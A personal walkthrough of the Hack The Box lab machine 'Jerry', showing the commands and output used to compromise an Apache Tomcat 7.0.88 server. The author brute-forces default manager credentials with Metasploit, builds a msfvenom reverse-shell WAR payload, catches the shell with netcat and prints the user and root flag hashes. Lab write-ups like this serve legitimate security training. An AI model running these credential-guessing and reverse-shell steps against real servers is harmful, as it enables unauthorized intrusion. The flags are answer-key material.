This is my write-up/walkthrough for [the Hack The Box machine, Jerry](https://app.hackthebox.com/machines/Jerry). It's a Windows machine, rated "Easy", with 10.10.10.95 as its IP address.

![Alt text](/images/2022-02-16-hack-the-box-jerry-01.JPG "Jerry Info Card")

I started with an nmap scan—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.95
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-21 08:09 EST
Nmap scan report for 10.10.10.95
Host is up (0.39s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   436.43 ms 10.10.16.1
2   436.44 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.05 seconds
```

—that told me we've got Apache Tomcat running on port 8080 here. Nothing else of interest, and that told me I shouldn't look for anything else. This box is to be pwned by exploiting an Apache Tomcat vulnerability.

Opening 10.10.10.95:8080 on my browser told me we are dealing with version 7.0.88 of Apache Tomcat. (Well, the nmap scan also pointed that out, but it's good to hit the URL once, if you can.)

![Alt text](/images/2022-02-16-hack-the-box-jerry-02.JPG "Apache Tomcat 7.0.88")

Running searchsploit on "Apache Tomcat 7.0.88"—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ searchsploit Apache Tomcat 7.0.88
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                               | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                               | jsp/webapps/42966.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

—pointed out that there is indeed a potential vulnerability out there for me to exploit. I started reading more into this. Turns out, if you have valid credentials for the "manager" application on the server, you can upload a backdoor in the form of a .war file on to the server, that should in turn get you a reverse shell. [This](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/) is a good article on this, and the one I consulted for this hack.

But, in order for me to exploit this vulnerability, I needed the right credentials on this "manager" application – 10.10.10.95:8080/manager.

![Alt text](/images/2022-02-16-hack-the-box-jerry-03.JPG "Manager")

Ran some [common username+password combos](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown), but none broke through.

I wanted to try Metasploit, though, since I had been seeing it get mentioned a lot on the forums I had been lurking on, so I decided to give it a shot.

Took me a while to figure out the right commands—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo msfdb --help                                                                                                                                                                    1 ⨯
[-] Error: unrecognized action '--help'

Manage the metasploit framework database

You can use an specific port number for the
PostgreSQL connection setting the PGPORT variable
in the current shell.

Example: PGPORT=5433 msfdb init

  msfdb init     # start and initialize the database
  msfdb reinit   # delete and reinitialize the database
  msfdb delete   # delete database and stop using it
  msfdb start    # start the database
  msfdb stop     # stop the database
  msfdb status   # check service status
  msfdb run      # start the database and run msfconsole
```

—but once I did, it was fairly simple.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo msfdb init  
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema

┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo msfconsole                                                                                                                                                                      1 ⨯
                                                  

*Neutrino_Cannon*PrettyBeefy*PostalTime*binbash*deadastronauts*EvilBunnyWrote*L1T*Mail.ru*() { :;}; echo vulnerable*
*Team sorceror*ADACTF*BisonSquad*socialdistancing*LeukeTeamNaam*OWASP Moncton*Alegori*exit*Vampire Bunnies*APT593*
*QuePasaZombiesAndFriends*NetSecBG*coincoin*ShroomZ*Slow Coders*Scavenger Security*Bruh*NoTeamName*Terminal Cult*
*edspiner*BFG*MagentaHats*0x01DA*Kaczuszki*AlphaPwners*FILAHA*Raffaela*HackSurYvette*outout*HackSouth*Corax*yeeb0iz*
*SKUA*Cyber COBRA*flaghunters*0xCD*AI Generated*CSEC*p3nnm3d*IFS*CTF_Circle*InnotecLabs*baadf00d*BitSwitchers*0xnoobs*
*ItPwns - Intergalactic Team of PWNers*PCCsquared*fr334aks*runCMD*0x194*Kapital Krakens*ReadyPlayer1337*Team 443*
*H4CKSN0W*InfOUsec*CTF Community*DCZia*NiceWay*0xBlueSky*ME3*Tipi'Hack*Porg Pwn Platoon*Hackerty*hackstreetboys*
*ideaengine007*eggcellent*H4x*cw167*localhorst*Original Cyan Lonkero*Sad_Pandas*FalseFlag*OurHeartBleedsOrange*SBWASP*
*Cult of the Dead Turkey*doesthismatter*crayontheft*Cyber Mausoleum*scripterz*VetSec*norbot*Delta Squad Zero*Mukesh*
*x00-x00*BlackCat*ARESx*cxp*vaporsec*purplehax*RedTeam@MTU*UsalamaTeam*vitamink*RISC*forkbomb444*hownowbrowncow*
*etherknot*cheesebaguette*downgrade*FR!3ND5*badfirmware*Cut3Dr4g0n*dc615*nora*Polaris One*team*hail hydra*Takoyaki*
*Sudo Society*incognito-flash*TheScientists*Tea Party*Reapers of Pwnage*OldBoys*M0ul3Fr1t1B13r3*bearswithsaws*DC540*
*iMosuke*Infosec_zitro*CrackTheFlag*TheConquerors*Asur*4fun*Rogue-CTF*Cyber*TMHC*The_Pirhacks*btwIuseArch*MadDawgs*
*HInc*The Pighty Mangolins*CCSF_RamSec*x4n0n*x0rc3r3rs*emehacr*Ph4n70m_R34p3r*humziq*Preeminence*UMGC*ByteBrigade*
*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
*' UNION SELECT 'password*      _________                __                                  *OCD247*Sparkle Pony* 
*burner_herz0g*                 \_   ___ \_____  _______/  |_ __ _________   ____            *Kill$hot*ConEmu*
*here_there_be_trolls*          /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \           *;echo"hacked"*
*r4t5_*6rung4nd4*NYUSEC*        \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/           *karamel4e*
*IkastenIO*TWC*balkansec*        \______  (____  /   __/|__| |____/ |__|    \___  >          *cybersecurity.li*
*TofuEelRoll*Trash Pandas*              \/     \/|__|                           \/           *OneManArmy*cyb3r_w1z4rd5*
*Astra*Got Schwartz?*tmux*                  ___________.__                                   *AreYouStuck*Mr.Robot.0*
*\nls*Juicy white peach*                    \__    ___/|  |__   ____                         *EPITA Rennes*
*HackerKnights*                               |    |   |  |  \_/ __ \                        *guildOfGengar*Titans*
*Pentest Rangers*                             |    |   |   Y  \  ___/                        *The Libbyrators*
*placeholder name*bitup*                      |____|   |___|  /\___  >                       *JeffTadashi*Mikeal*
*UCASers*onotch*                                            \/     \/                        *ky_dong_day_song*
*NeNiNuMmOk*                              ___________.__                                     *JustForFun!*
*Maux de tête*LalaNG*                     \_   _____/|  | _____     ____                     *g3tsh3Lls0on*
*crr0tz*z3r0p0rn*clueless*                 |    __)  |  | \__  \   / ___\                    *Phở Đặc Biệt*Paradox*
*HackWara*                                 |     \   |  |__/ __ \_/ /_/  >                   *KaRIPux*inf0sec*
*Kugelschreibertester*                     \___  /   |____(____  /\___  /                    *bluehens*Antoine77*
*icemasters*                                   \/              \//_____/                     *genxy*TRADE_NAMES*
*Spartan's Ravens*                       _______________   _______________                   *BadByte*fontwang_tw*
*g0ldd1gg3rs*pappo*                     \_____  \   _  \  \_____  \   _  \                   *ghoti*
*Les CRACKS*c0dingRabbits*               /  ____/  /_\  \  /  ____/  /_\  \                  *LinuxRiders*   
*2Cr4Sh*RecycleBin*                     /       \  \_/   \/       \  \_/   \                 *Jalan Durian*
*ExploitStudio*                         \_______ \_____  /\_______ \_____  /                 *WPICSC*logaritm*
*Car RamRod*0x41414141*                         \/     \/         \/     \/                  *Orv1ll3*team-fm4dd*
*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
*Mars Explorer*ozen_cfw*Fat Boys*Simpatico*nzdjb*Isec-U.O*The Pomorians*T35H*H@wk33*JetJ*OrangeStar*Team Corgi*
*D0g3*0itch*OffRes*LegionOfRinf*UniWA*wgucoo*Pr0ph3t*L0ner*_n00bz*OSINT Punchers*Tinfoil Hats*Hava*Team Neu*
*Cyb3rDoctor*Techlock Inc*kinakomochi*DubbelDopper*bubbasnmp*w*Gh0st$*tyl3rsec*LUCKY_CLOVERS*ev4d3rx10-team*ir4n6*
*PEQUI_ctf*HKLBGD*L3o*5 bits short of a byte*UCM*ByteForc3*Death_Geass*Stryk3r*WooT*Raise The Black*CTErr0r*
*Individual*mikejam*Flag Predator*klandes*_no_Skids*SQ.*CyberOWL*Ironhearts*Kizzle*gauti*
*San Antonio College Cyber Rangers*sam.ninja*Akerbeltz*cheeseroyale*Ephyra*sard city*OrderingChaos*Pickle_Ricks*
*Hex2Text*defiant*hefter*Flaggermeister*Oxford Brookes University*OD1E*noob_noob*Ferris Wheel*Ficus*ONO*jameless*
*Log1c_b0mb*dr4k0t4*0th3rs*dcua*cccchhhh6819*Manzara's Magpies*pwn4lyfe*Droogy*Shrubhound Gang*ssociety*HackJWU*
*asdfghjkl*n00bi3*i-cube warriors*WhateverThrone*Salvat0re*Chadsec*0x1337deadbeef*StarchThingIDK*Tieto_alaviiva_turva*
*InspiV*RPCA Cyber Club*kurage0verfl0w*lammm*pelicans_for_freedom*switchteam*tim*departedcomputerchairs*cool_runnings*
*chads*SecureShell*EetIetsHekken*CyberSquad*P&K*Trident*RedSeer*SOMA*EVM*BUckys_Angels*OrangeJuice*DemDirtyUserz*
*OpenToAll*Born2Hack*Bigglesworth*NIS*10Monkeys1Keyboard*TNGCrew*Cla55N0tF0und*exploits33kr*root_rulzz*InfosecIITG*
*superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
*damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*



       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to 
check out the result of hosts and services

msf6 > 
```

whoa.

"Alright, how do I use it, though?" 

Thankfully, I stumbled upon [this](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/) article which was fairly thorough. I ran a search on "tomcat manager":


```
msf6 > search tomcat manager

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  auxiliary/dos/http/apache_commons_fileupload_dos  2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1  exploit/multi/http/tomcat_mgr_deploy              2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   2  exploit/multi/http/tomcat_mgr_upload              2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   3  exploit/multi/http/cisco_dcnm_upload_2019         2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   4  auxiliary/admin/http/ibm_drm_download             2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   5  auxiliary/scanner/http/tomcat_mgr_login                            normal     No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/http/tomcat_mgr_login
```

That "tomcat_mgr_login" one seemed to be what we want since we first need the right credentials on this server, before we can even think of putting a backdoor that will get us the reverse shell.


```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > info

       Name: Tomcat Application Manager Login Utility
     Module: auxiliary/scanner/http/tomcat_mgr_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  MC <mc@metasploit.com>
  Matteo Cantoni <goony@nothink.org>
  jduck <jduck@metasploit.com>

Check supported:
  No

Basic options:
  Name              Current Setting                                                  Required  Description
  ----              ---------------                                                  --------  -----------
  BLANK_PASSWORDS   false                                                            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                                                                yes       How fast to bruteforce, from 0 to 5
  DB_ALL_CREDS      false                                                            no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false                                                            no        Add all passwords in the current database to the list
  DB_ALL_USERS      false                                                            no        Add all users in the current database to the list
  DB_SKIP_EXISTING  none                                                             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
  PASSWORD                                                                           no        The HTTP password to specify for authentication
  PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_defau  no        File containing passwords, one per line
                    lt_pass.txt
  Proxies                                                                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                                                                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT             8080                                                             yes       The target port (TCP)
  SSL               false                                                            no        Negotiate SSL/TLS for outgoing connections
  STOP_ON_SUCCESS   false                                                            yes       Stop guessing when a credential works for a host
  TARGETURI         /manager/html                                                    yes       URI for Manager login. Default is /manager/html
  THREADS           1                                                                yes       The number of concurrent threads (max one per host)
  USERNAME                                                                           no        The HTTP username to specify for authentication
  USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_defau  no        File containing users and passwords separated by space, one pair per line
                    lt_userpass.txt
  USER_AS_PASS      false                                                            no        Try the username as the password for all users
  USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_defau  no        File containing users, one per line
                    lt_users.txt
  VERBOSE           true                                                             yes       Whether to print output for all attempts
  VHOST                                                                              no        HTTP server virtual host

Description:
  This module simply attempts to login to a Tomcat Application Manager 
  instance using a specific user/pass.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3843
  OSVDB (60317)
  http://www.securityfocus.com/bid/37086
  https://nvd.nist.gov/vuln/detail/CVE-2009-4189
  OSVDB (60670)
  http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html
  http://www.zerodayinitiative.com/advisories/ZDI-09-085
  https://nvd.nist.gov/vuln/detail/CVE-2009-4188
  http://www.securityfocus.com/bid/38084
  https://nvd.nist.gov/vuln/detail/CVE-2010-0557
  http://www-01.ibm.com/support/docview.wss?uid=swg21419179
  https://nvd.nist.gov/vuln/detail/CVE-2010-4094
  http://www.zerodayinitiative.com/advisories/ZDI-10-214
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
  OSVDB (60176)
  http://www.securityfocus.com/bid/36954
  http://tomcat.apache.org/
  https://nvd.nist.gov/vuln/detail/CVE-1999-0502
```

As far as I understood, point the right host and port to this module and it will bruteforce its way through and get you the credentials you need.


```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 10.10.10.95
RHOST => 10.10.10.95
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8080
RPORT => 8080 
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: both:role1 (Incorrect)
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/tomcat_mgr_login) > 
```

Got 'em! Our username+password combo is tomcat:s3cret.

![Alt text](/images/2022-02-16-hack-the-box-jerry-04.JPG "Console")

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ git clone https://github.com/mgeeky/tomcatWarDeployer.git                                                             
Cloning into 'tomcatWarDeployer'...
remote: Enumerating objects: 276, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 276 (delta 2), reused 6 (delta 2), pack-reused 269
Receiving objects: 100% (276/276), 210.13 KiB | 1.98 MiB/s, done.
Resolving deltas: 100% (150/150), done.
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~]
└─$ cd tomcatWarDeployer       
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/tomcatWarDeployer]
└─$ ls
LICENSE  README.md  requirements.txt  screen1.png  tomcatWarDeployer.py
                                                                                                                                                                                             
┌──(thatvirdiguy㉿kali)-[~/tomcatWarDeployer]
└─$ python2 tomcatWarDeployer.py --help                                                                                                                                                  1 ⨯
Usage: tomcatWarDeployer.py [options] server

  server                Specifies server address. Please also include port after colon. May start with http:// or https://

Options:
  -h, --help            show this help message and exit

  General options:
    -V, --version       Version information.
    -v, --verbose       Verbose mode.
    -s, --simulate      Simulate breach only, do not perform any offensive
                        actions.
    -G OUTFILE, --generate=OUTFILE
                        Generate JSP backdoor only and put it into specified
                        outfile path then exit. Do not perform any
                        connections, scannings, deployment and so on.
    -U USER, --user=USER
                        Tomcat Manager Web Application HTTP Auth username.
                        Default=<none>, will try various pairs.
    -P PASS, --pass=PASS
                        Tomcat Manager Web Application HTTP Auth password.
                        Default=<none>, will try various pairs.

  Connection options:
    -H RHOST, --host=RHOST
                        Remote host for reverse tcp payload connection. When
                        specified, RPORT must be specified too. Otherwise,
                        bind tcp payload will be deployed listening on 0.0.0.0
    -p PORT, --port=PORT
                        Remote port for the reverse tcp payload when used with
                        RHOST or Local port if no RHOST specified thus acting
                        as a Bind shell endpoint.
    -u URL, --url=URL   Apache Tomcat management console URL. Default: empty
    -t TIMEOUT, --timeout=TIMEOUT
                        Speciifed timeout parameter for socket object and
                        other timing holdups. Default: 10

  Payload options:
    -R, --remove        Remove deployed app with specified name. Can be used
                        for post-assessment cleaning
    -X PASSWORD, --shellpass=PASSWORD
                        Specifies authentication password for uploaded shell,
                        to prevent unauthenticated usage. Default: randomly
                        generated. Specify "None" to leave the shell
                        unauthenticated.
    -T TITLE, --title=TITLE
                        Specifies head>title for uploaded JSP WAR payload.
                        Default: "JSP Application"
    -n APPNAME, --name=APPNAME
                        Specifies JSP application name. Default: "jsp_app"
    -x, --unload        Unload existing JSP Application with the same name.
                        Default: no.
    -C, --noconnect     Do not connect to the spawned shell immediately. By
                        default this program will connect to the spawned
                        shell, specifying this option let's you use other
                        handlers like Metasploit, NetCat and so on.
    -f WARFILE, --file=WARFILE
                        Custom WAR file to deploy. By default the script will
                        generate own WAR file on-the-fly.
						
┌──(thatvirdiguy㉿kali)-[~/tomcatWarDeployer]
└─$ python2 tomcatWarDeployer.py -U tomcat -P s3cret -H 10.10.16.2 -p 1234 10.10.10.95:8080

        tomcatWarDeployer (v. 0.5.2)
        Apache Tomcat auto WAR deployment & launching tool
        Mariusz Banach / MGeeky '16-18

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.

INFO: Reverse shell will connect to: 10.10.16.2:1234.
INFO: Apache Tomcat/7.0.88 Manager Application reached & validated.
INFO:   At: "http://10.10.10.95:8080/manager"
ERROR: Executing 'where jar' returned: 'Command 'where jar' returned non-zero exit status 127'
Traceback (most recent call last):
  File "tomcatWarDeployer.py", line 1224, in <module>
    main()
  File "tomcatWarDeployer.py", line 1102, in main
    code, opts.title, opts.appname)
  File "tomcatWarDeployer.py", line 368, in generateWAR
    raise MissingDependencyError
__main__.MissingDependencyError
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f war > shell.war
Payload size: 1095 bytes
Final size of war file: 1095 bytes

┌──(thatvirdiguy㉿kali)-[~]
└─$ ls | grep shell.war
shell.war
```

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ nc -lvp 1234                                                                                                                                                                         1 ⨯
listening on [any] 1234 ...

10.10.10.95: inverse host lookup failed: Unknown host
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
C:\apache-tomcat-7.0.88>
C:\apache-tomcat-7.0.88>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\apache-tomcat-7.0.88

06/19/2018  03:07 AM    <DIR>          .
06/19/2018  03:07 AM    <DIR>          ..
06/19/2018  03:06 AM    <DIR>          bin
06/19/2018  05:47 AM    <DIR>          conf
06/19/2018  03:06 AM    <DIR>          lib
05/07/2018  01:16 PM            57,896 LICENSE
02/21/2022  10:13 PM    <DIR>          logs
05/07/2018  01:16 PM             1,275 NOTICE
05/07/2018  01:16 PM             9,600 RELEASE-NOTES
05/07/2018  01:16 PM            17,454 RUNNING.txt
06/19/2018  03:06 AM    <DIR>          temp
02/21/2022  11:58 PM    <DIR>          webapps
06/19/2018  03:34 AM    <DIR>          work
               4 File(s)         86,225 bytes
               9 Dir(s)   2,419,970,048 bytes free

C:\apache-tomcat-7.0.88>cd ../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\

06/19/2018  03:07 AM    <DIR>          apache-tomcat-7.0.88
08/22/2013  05:52 PM    <DIR>          PerfLogs
06/19/2018  05:42 PM    <DIR>          Program Files
06/19/2018  05:42 PM    <DIR>          Program Files (x86)
06/18/2018  10:31 PM    <DIR>          Users
01/21/2022  08:53 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,419,970,048 bytes free

C:\>cd Users    
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/18/2018  10:31 PM    <DIR>          Administrator
08/22/2013  05:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,419,970,048 bytes free

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/19/2018  05:43 AM    <DIR>          Contacts
06/19/2018  06:09 AM    <DIR>          Desktop
06/19/2018  05:43 AM    <DIR>          Documents
01/21/2022  08:23 PM    <DIR>          Downloads
06/19/2018  05:43 AM    <DIR>          Favorites
06/19/2018  05:43 AM    <DIR>          Links
06/19/2018  05:43 AM    <DIR>          Music
06/19/2018  05:43 AM    <DIR>          Pictures
06/19/2018  05:43 AM    <DIR>          Saved Games
06/19/2018  05:43 AM    <DIR>          Searches
06/19/2018  05:43 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,419,970,048 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,419,970,048 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,970,048 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>
```
